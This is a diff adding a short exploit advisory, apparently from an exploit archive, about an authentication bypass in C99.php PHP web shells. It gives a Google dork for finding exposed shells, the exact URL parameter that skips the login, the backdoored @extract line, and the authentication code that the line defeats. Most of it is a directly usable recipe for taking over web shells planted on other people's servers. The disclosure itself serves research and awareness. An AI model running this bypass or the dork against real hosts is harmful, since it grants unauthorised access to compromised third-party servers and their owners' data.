@@ -1,0 +1,37 @@
+# Exploit Title: C99 Shell Authentication Bypass via Backdoor
+# Google Dork: inurl:c99.php
+# Date: June 23, 2014
+# Exploit Author: mandatory ( Matthew Bryant )
+# Vendor Homepage: http://ccteam.ru/
+# Software Link: https://www.google.com/
+# Version: < 1.00 beta
+# Tested on:Linux 
+# CVE: N/A
+
+All C99.php shells are backdoored. To bypass authentication add "?c99shcook[login]=0" to the URL. 
+
+e.g. http://127.0.0.1/c99.php?c99shcook[login]=0
+
+The backdoor:
+@extract($_REQUEST["c99shcook"]);
+
+Which bypasses the authentication here:
+if ($login) {
+    if (empty($md5_pass)) {
+        $md5_pass = md5($pass);
+    }
+    if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass)) {
+        if ($login_txt === false) {
+            $login_txt = "";
+        } elseif (empty($login_txt)) {
+            $login_txt = strip_tags(ereg_replace("&nbsp;|<br>", " ", $donated_html));
+        }
+        header("WWW-Authenticate: Basic realm=\"c99shell " . $shver . ": " . $login_txt . "\"");
+        header("HTTP/1.0 401 Unauthorized");
+        exit($accessdeniedmess);
+    }
+}
+
+For more info: http://thehackerblog.com/every-c99-php-shell-is-backdoored-aka-free-shells/
+
+~mandatory
